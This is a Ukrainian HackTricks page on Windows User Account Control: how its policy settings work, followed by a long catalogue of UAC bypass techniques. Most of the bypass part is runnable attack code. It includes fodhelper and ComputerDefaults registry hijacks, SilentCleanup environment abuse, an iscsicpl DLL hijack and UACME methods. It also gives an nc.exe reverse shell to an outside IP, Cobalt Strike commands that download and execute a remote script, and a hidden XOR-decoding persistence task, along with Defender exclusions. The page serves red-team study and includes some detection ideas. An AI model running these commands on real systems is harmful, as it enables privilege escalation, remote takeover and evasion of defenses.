# UAC - Контроль облікових записів користувачів

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка виводить **запит на підтвердження дій із підвищеними привілеями**. Програми мають різні рівні `integrity`, а програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, програми й завдання завжди **виконуються в контексті безпеки облікового запису без прав адміністратора**, якщо адміністратор явно не надасть цим програмам/завданням доступ до системи на рівні адміністратора. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.<sup>[[2]](#references)</sup>

Докладніше про рівні цілісності:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC увімкнено, користувач-адміністратор отримує 2 токени: токен стандартного користувача для звичайних дій із середнім рівнем цілісності та токен із правами адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) докладно описано роботу UAC, зокрема процес входу, взаємодію з користувачем і архітектуру UAC.<sup>[[2]](#references)</sup> Адміністратори можуть налаштувати роботу UAC відповідно до потреб організації за допомогою політик безпеки на локальному рівні (через secpol.msc) або налаштувати параметри й розгорнути їх за допомогою об’єктів групової політики (GPO) у середовищі домену Active Directory. Різні параметри докладно описані [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів групової політики. У таблиці нижче наведено додаткові відомості:

| Параметр групової політики                                                                                                                                                                                                                                                                                                                                                           | Розділ реєстру                | Значення за замовчуванням                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Контроль облікових записів користувачів: режим схвалення адміністратором для вбудованого облікового запису адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: поведінка запиту на підвищення привілеїв для адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Запитувати підтвердження для файлів, що не належать Windows, на захищеному робочому столі) |
| [Контроль облікових записів користувачів: поведінка запиту на підвищення привілеїв для стандартних користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Запитувати облікові дані на захищеному робочому столі)         |
| [Контроль облікових записів користувачів: виявляти інсталяції програм і запитувати підвищення привілеїв](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Увімкнено; за замовчуванням вимкнено у випусках Enterprise)           |
| [Контроль облікових записів користувачів: підвищувати привілеї лише для підписаних і перевірених виконуваних файлів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: підвищувати привілеї для програм UIAccess, установлених лише в захищених розташуваннях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: запускати всіх адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: дозволяти програмам UIAccess запитувати підвищення привілеїв без використання захищеного робочого столу](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: перемикатися на захищений робочий стіл під час запиту на підвищення привілеїв](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: віртуалізувати помилки запису файлів і реєстру, перенаправляючи їх у розташування користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Увімкнено)                                              |

### Політики встановлення програмного забезпечення у Windows

За замовчуванням **локальні політики безпеки** (на більшості систем — "secpol.msc") налаштовано так, щоб **заборонити користувачам без прав адміністратора встановлювати програмне забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора завантажить інсталятор вашого програмного забезпечення, він не зможе запустити його без облікового запису адміністратора.

### Розділи реєстру для примусового запиту UAC на підвищення привілеїв

Якщо ви звичайний користувач без прав адміністратора, можна налаштувати так, щоб під час спроби виконати певні дії обліковий запис "стандартного" користувача **отримував від UAC запит на введення облікових даних**. Для цього потрібно змінити певні **розділи реєстру**, що потребує прав адміністратора, якщо тільки немає **UAC bypass** або зловмисник уже не ввійшов як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують його **повторно ввести облікові дані свого облікового запису**, щоб виконати адміністративні дії.

**На практиці це корисно лише тоді, коли у вас уже є підвищений токен, UAC bypass або помилкова конфігурація, що дає змогу змінити ці ключі; інакше запис до реєстру буде заблоковано.**

Змініть такі розділи й записи реєстру (значення за замовчуванням наведено в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну за допомогою інструмента «Локальна політика безпеки». Після зміни параметрів під час виконання адміністративних операцій система проситиме користувача повторно ввести облікові дані.

### Примітка

**Контроль облікових записів користувачів не є межею безпеки.** Тому звичайні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без експлойта для локального підвищення привілеїв.

### Попросити користувача надати «повний доступ до комп’ютера»

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Привілеї UAC

- Захищений режим Internet Explorer використовує перевірки рівня цілісності, щоб процеси з високим рівнем цілісності (наприклад, веббраузери) не мали доступу до даних із низьким рівнем цілісності (наприклад, папки тимчасових файлів Internet). Для цього браузер запускається з токеном низького рівня цілісності. Коли браузер намагається отримати доступ до даних у зоні з низьким рівнем цілісності, операційна система перевіряє рівень цілісності процесу та відповідно дозволяє доступ. Ця функція допомагає запобігти отриманню доступу до конфіденційних даних у системі внаслідок атак remote code execution.
- Коли користувач входить у Windows, система створює токен доступу зі списком привілеїв користувача. Привілеї визначаються як сукупність прав і можливостей користувача. Токен також містить список облікових даних користувача, які використовуються для його автентифікації на комп’ютері та в мережевих ресурсах.

### Autoadminlogon

Щоб налаштувати автоматичний вхід певного користувача до Windows під час запуску, задайте **ключ реєстру `AutoAdminLogon`**. Це корисно в середовищах кіосків або для тестування. Використовуйте цю функцію лише в захищених системах, оскільки вона зберігає пароль у реєстрі.

Задайте наведені нижче ключі за допомогою редактора реєстру або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Щоб повернутися до звичайного режиму входу, задайте для `AutoAdminLogon` значення 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо у вас є графічний доступ до системи жертви, UAC bypass виконується просто — достатньо натиснути «Так», коли з’явиться запит UAC.

UAC bypass потрібен у такій ситуації: **UAC увімкнено, ваш процес працює в контексті із середнім рівнем цілісності, а ваш користувач належить до групи адміністраторів**.

Важливо зазначити, що **обійти UAC набагато складніше, якщо встановлено найвищий рівень безпеки (Always), ніж за будь-якого з інших рівнів (Default).**

### Швидке первинне оцінювання з оболонки із середнім рівнем цілісності

Перш ніж намагатися виконати bypass, переконайтеся, що ви перебуваєте в потрібному сценарії, і зіставте збірку хоста з відомими робочими методами:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Практичні нотатки:
- Якщо `EnableLUA=0`, обходити захист не потрібно: будь-який токен адміністратора може безпосередньо запросити високий рівень цілісності.
- `ConsentPromptBehaviorAdmin=2` або `5` — типовий сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує планку, але все одно перевіряйте конкретну збірку, а не припускайте, що обхід не спрацює: UACME досі відстежує деякі методи, сумісні з `AlwaysNotify`, у сучасних збірках Windows.<sup>[[3]](#references)</sup>

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` має значення **`0`**), ви можете **запустити reverse shell із правами адміністратора** (з високим рівнем цілісності), використовуючи щось на кшталт:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### Обхід UAC за допомогою дублювання токена

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + повторно використовуваний об’єкт налагодження

Інтерфейс локального RPC AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` може створювати процес із увімкненим налагодженням. Процеси, створені для налагодження в одному потоці, використовують спільний об’єкт налагодження потоку; подія створення містить дескриптор процесу з повним доступом, навіть якщо результат RPC надає лише обмежений доступ. Завдяки повторному використанню об’єкта налагодження учасник групи Administrators із середнім рівнем цілісності отримує примітив для UAC.<sup>[[11]](#references)[[12]](#references)</sup>

Практичний ланцюжок дій:<sup>[[11]](#references)[[12]](#references)</sup>

1. Викличте метод локального RPC (безпосередньо або через `NdrAsyncClientCall`), щоб створити допоміжний процес без підвищених привілеїв із увімкненим налагодженням.
2. Запитайте `ProcessDebugObjectHandle` за допомогою `NtQueryInformationProcess`, від’єднайте його через `NtRemoveProcessDebug`, збережіть об’єкт і завершіть допоміжний процес.
3. Використайте той самий інтерфейс RPC, щоб створити довірений процес із автоматичним підвищенням привілеїв, а потім пов’яжіть збережений об’єкт із потоком, що викликає функцію, через `DbgUiSetThreadDebugObject`.
4. Викличте `WaitForDebugEvent` і отримайте дескриптор процесу з події `CREATE_PROCESS_DEBUG_EVENT`; перед продовженням продублюйте його за допомогою `NtDuplicateObject`.
5. Передайте продубльований дескриптор у `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` і запустіть payload зі структурою розширеної інформації запуску. Це дає змогу повторно використати контекст процесу з підвищеними привілеями та створити для дочірнього процесу зв’язок із батьківським процесом, який виглядає довіреним.

Шукайте саме цю коротку послідовність, а не лише виконуваний файл з автоматичним підвищенням привілеїв: створення процесу через локальний RPC AppInfo, запити `ProcessDebugObjectHandle`, від’єднання та повторне під’єднання налагоджувача, негайна подія створення для налагодження, дублювання дескриптора та дочірній процес, записаний батьківський процес якого не збігається з процесом, що викликав API створення.<sup>[[12]](#references)</sup>

### **Дуже** базовий «обхід» UAC (повний доступ до файлової системи)

Якщо у вас є shell користувача, який входить до групи Administrators, ви можете **підключити спільний ресурс C$** через SMB (файлову систему) локально як новий диск і отримати **доступ до всього в файловій системі** (навіть до домашньої теки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Обхід UAC за допомогою Cobalt Strike

Методи Cobalt Strike працюватимуть, лише якщо для UAC не встановлено максимальний рівень безпеки.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** та **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### Підвищені інтерфейси COM (`ICMLuaUtil` / `CMSTPLUA`)

Автоматично підвищувані об’єкти COM залишаються практичним вектором UAC у сучасних збірках. UACME досі відстежує `ICMLuaUtil` як робочий на поточних гілках Windows, а засоби для offensive security продовжують адаптувати `CMSTPLUA`, поєднуючи інтерактивний процес на робочому столі, 64-бітне виконання, а іноді й маскування PEB/процесу перед викликом COM Elevation Moniker.<sup>[[3]](#references)</sup>

Практичні поради:
- Віддавайте перевагу **64-бітному** процесу в **інтерактивному сеансі** користувача (зазвичай `explorer.exe` або його дочірньому процесу).
- Якщо raw shell не працює, спробуйте ще раз за допомогою реалізації BOF / UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірній процес запуститься в **окремому процесі з підвищеними привілеями**; багато BOF не підвищують привілеї поточного beacon на місці.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Експлойти для обходу UAC

[**UACME**](https://github.com/hfiref0x/UACME) — це збірка методів обходу UAC. Скомпілюйте її за допомогою Visual Studio або MSBuild; під час збирання створюється кілька виконуваних файлів (наприклад, `Source\Akagi\output\x64\Debug\Akagi.exe`), тож виберіть метод, що підходить для цільової збірки.<sup>[[3]](#references)</sup>\
Будьте обережні: деякі методи обходу запускають видимі програми або вікна запитів, які можуть привернути увагу користувача.<sup>[[3]](#references)</sup>

В UACME зазначено **версію збірки, починаючи з якої працює кожен метод**.<sup>[[3]](#references)</sup> Ви можете пошукати метод, що впливає на ваші версії:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Також за допомогою [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінки можна визначити випуск Windows `1607` за версіями збірок.

Практичний підхід: спочатку **оцінити збірку хоста**, а потім запустити відповідний метод:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` швидко порівнює локальну збірку з відомими йому методами UAC, що дає змогу швидко відсіяти застарілі PoC.<sup>[[4]](#references)</sup>
- `UACME` залишається найкращим загальнодоступним каталогом для зіставлення bypass із конкретною збіркою. У версії 3.7.1 додано методи 83–85, а в попередньому випуску наявні методи було повторно протестовано на **Windows 11 25H2**; перевіряйте таблицю методів і примітки до випуску, а не припускайте, що старий PoC досі працює без змін.<sup>[[3]](#references)[[9]](#references)</sup>

### Ланцюжки WNF/UIAccess, сумісні з Always Notify (UACME 3.7.1)

`Always Notify` не усуває всі bypass UAC. UACME 3.7.1 реалізує три нові методи для x64, які поєднують контрольований користувачем стан середовища/протоколу з поведінкою запланованих завдань із підвищеними правами або UIAccess, і позначає всі їх як `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** перенаправте `SystemRoot`, щоб завдання `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, викликане через WNF, змусило `taskhostw.exe` із підвищеними правами виконати side-load `unifiedconsent.dll`. UACME відстежує цей метод починаючи зі збірки Windows 10 19041.
- **84 — TabTip:** застосуйте той самий примітив із змінною середовища до UIAccess `TabTip.exe`, який залежно від збірки завантажує `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` або `rsaenh.dll`, а потім перейдіть із отриманого контексту UIAccess із високим рівнем цілісності. UACME відстежує цей метод починаючи з Windows 8.1 / Server 2016.
- **85 — Narrator:** перехопіть протокол `feedback-hub` для поточного користувача, керуйте Narrator за допомогою `Alt+CapsLock+F`, а потім запустіть доступну для запису копію `osk.exe`, яка виконує side-load `OskSupport.dll`. Для цього потрібен інтерактивний робочий стіл; метод відстежується починаючи з Windows 10 1809 / Server 2019.

Після створення модулів payload і Akagi, як описано в UACME, запустіть відповідний метод за його номером (необов’язкова команда за замовчуванням — `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Методи 84 і 85 залежать від UIAccess/взаємодії з робочим столом, тому не очікуйте, що вони працюватимуть без змін із Session 0 або неінтерактивної оболонки служби. Усі три методи змінюють стан середовища/протоколу та розміщують DLL; перевірте реалізацію та видаліть ці артефакти після тестування.<sup>[[3]](#references)[[9]](#references)</sup>

### Обхід UAC – fodhelper.exe (підміна в реєстрі)

Довірений бінарний файл `fodhelper.exe` автоматично запускається з підвищеними привілеями в сучасних версіях Windows. Під час запуску він звертається до наведеного нижче шляху реєстру для поточного користувача, не перевіряючи дієслово `DelegateExecute`. Додавання туди команди дає змогу процесу з рівнем цілісності Medium Integrity (користувач входить до групи Administrators) запустити процес із рівнем цілісності High Integrity без запиту UAC.

Шлях реєстру, до якого звертається fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Кроки PowerShell (налаштуйте payload, а потім запустіть)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Примітки:
- Працює, якщо поточний користувач входить до групи Administrators, а рівень UAC — типовий/помірний (не Always Notify з додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу в 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Для непомітності уникайте діалогових вікон.

#### Тригер `ComputerDefaults.exe` для того самого обробника `ms-settings`

`ComputerDefaults.exe` використовує ту саму прив’язку `ms-settings\Shell\Open\command` для поточного користувача, що й `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Після встановлення команди за замовчуванням і порожнього значення `DelegateExecute`, як описано вище, використайте `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` як альтернативний тригер; повторно налаштовувати реєстр не потрібно.<sup>[[13]](#references)[[14]](#references)</sup> Передумови щодо адміністратора із середнім рівнем цілісності та політики UAC, наведені вище в примітках до `fodhelper.exe`, також залишаються чинними.<sup>[[2]](#references)[[3]](#references)</sup> UACME містить цей тригер для Windows 10 RS4 (збірка 17134), тому перевірте його на цільовій збірці.<sup>[[3]](#references)</sup>

#### Варіант перехоплення CurVer/розширення (лише HKCU)

У нещодавніх зразках, що зловживають `fodhelper.exe`, не використовують `DelegateExecute`, а натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для поточного користувача. Підвищений автоматично бінарний файл і далі шукає обробник у `HKCU`, тож для створення ключів права адміністратора не потрібні:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Після отримання підвищених привілеїв шкідливе ПЗ зазвичай **вимикає майбутні запити**, задаючи для `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` значення `0`, а потім застосовує додаткові методи ухилення від захисту (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і повторно створює механізм закріплення, щоб запускатися з високим рівнем цілісності. Типове завдання для закріплення зберігає на диску **зашифрований XOR скрипт PowerShell**, щогодини декодує його та виконує в пам’яті:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Цей варіант усе ще видаляє dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, втручання в `ConsentPromptBehaviorAdmin`, створення виключень Defender або scheduled tasks, які розшифровують PowerShell у пам’яті.<sup>[[5]](#references)</sup>

### Обхід UAC через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та підставляє `%windir%` зі змінних середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, то можете перенаправити підстановку на довільну команду й отримати високий рівень цілісності без діалогового вікна підтвердження.<sup>[[8]](#references)</sup> Цей метод усе ще варто перевіряти на нових збірках, оскільки UACME продовжує підтримувати цю техніку, а в останніх звітах про проблеми зазначається, що для Windows 11 24H2 можуть знадобитися лише незначні коригування лапок.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Якщо завдання на цій збірці бере шлях у лапки, повторіть спробу, додавши лапку в кінці payload (наприклад, `cmd.exe"`). Після тестування завжди видаляйте `HKCU\Environment\windir`.

#### Інші способи обходу UAC

Для багатьох класичних способів обходу UAC, що використовують UI-процеси, COM-об’єкти або взаємодію з робочим столом, потрібен **повноцінний інтерактивний сеанс** із жертвою; звичайної оболонки `nc.exe` або служби, що працює в **Session 0**, часто недостатньо.

Часто це можна вирішити за допомогою сеансу **meterpreter**. Перейдіть до **процесу**, у якого значення **Session** дорівнює **1**:

![Спрямуйте ms-settings на власне розширення (.thm) і зв’яжіть це розширення з нашим payload — Інші способи обходу UAC: це можна зробити за допомогою сеансу meterpreter. Перейдіть до процесу, у якого значення Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### Обхід UAC за допомогою GUI

Якщо у вас є доступ до **GUI, ви можете просто прийняти запит UAC**, коли він з’явиться; технічний обхід насправді не потрібен. Тому для обходу практичних обмежень, які створює UAC, часто достатньо отримати сеанс GUI.

Крім того, якщо ви отримаєте сеанс GUI, яким хтось користувався (можливо, через RDP), там можуть бути **інструменти, запущені від імені адміністратора**, за допомогою яких можна, наприклад, **запустити** **cmd** безпосередньо **від імені адміністратора**, і UAC більше не запитуватиме підтвердження. Наприклад, [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи **непомітніше**.

### Гучний brute-force обхід UAC

Якщо шум не має значення, інструмент на кшталт [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) може багаторазово запитувати підвищення привілеїв, доки користувач не погодиться.

### Власний обхід — базова методологія обходу UAC

Якщо подивитися на **UACME**, можна помітити, що **багато способів обходу UAC використовують DLL hijacking** (часто змушуючи бінарний файл із підвищеними привілеями завантажити контрольовану зловмисником DLL із доступного для запису шляху). [Прочитайте це, щоб дізнатися, як знаходити вразливості DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть бінарний файл, який **автоматично отримує підвищені привілеї** (переконайтеся, що під час запуску він працює з високим рівнем цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть вказувати на вразливість до **DLL Hijacking**.
3. Імовірно, DLL доведеться **записати** в один із **захищених шляхів** (наприклад, C:\Windows\System32), куди у вас немає дозволу на запис. Це можна обійти за допомогою:
   1. **wusa.exe**: Windows 7, 8 і 8.1. Він дає змогу розпакувати вміст CAB-файлу в захищений шлях (оскільки цей інструмент запускається з високим рівнем цілісності).
   2. **IFileOperation**: Windows 10.
4. Підготуйте **скрипт**, який скопіює DLL у захищений шлях і запустить вразливий бінарний файл, що автоматично отримує підвищені привілеї.

### Інша техніка обходу UAC

Вона полягає в тому, щоб перевірити, чи намагається **бінарний файл з автоматичним підвищенням привілеїв** прочитати з **реєстру** **назву/шлях** **бінарного файлу** або **команди**, яку потрібно **виконати** (особливо цікаво, якщо бінарний файл шукає цю інформацію в **HKCU**).

### Обхід UAC через `SysWOW64\iscsicpl.exe` + DLL hijack через `PATH` користувача

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це бінарний файл з **автоматичним підвищенням привілеїв**, який можна змусити завантажити `iscsiexe.dll` відповідно до порядку пошуку. Якщо ви можете помістити шкідливу `iscsiexe.dll` у **доступну для запису користувачем** папку, а потім змінити `PATH` поточного користувача (наприклад, через `HKCU\Environment\Path`), щоб система шукала цю папку, Windows може завантажити DLL зловмисника в процес підвищених привілеїв `iscsicpl.exe` **без показу запиту UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Практичні зауваження:
- Це корисно, коли поточний користувач входить до групи **Administrators**, але через UAC працює з рівнем **Medium Integrity**.
- Для цього способу обходу потрібна копія **SysWOW64**. Вважайте копію **System32** окремим бінарним файлом і перевіряйте її поведінку окремо.
- Цей примітив поєднує **автоматичне підвищення привілеїв** і **DLL search-order hijacking**, тому для перевірки відсутнього завантаження DLL можна використовувати той самий процес роботи з ProcMon, що й для інших способів обходу UAC.

Мінімальна послідовність дій:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу запускається `C:\Windows\SysWOW64\iscsicpl.exe`.
- Шукайте `iscsiexe.dll` у **контрольованих користувачем** розташуваннях, наприклад `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Співвідносьте запуски `iscsicpl.exe` з неочікуваними дочірніми процесами або завантаженням DLL поза стандартними каталогами Windows.

### Новіші дослідження, які варто перевірити окремо

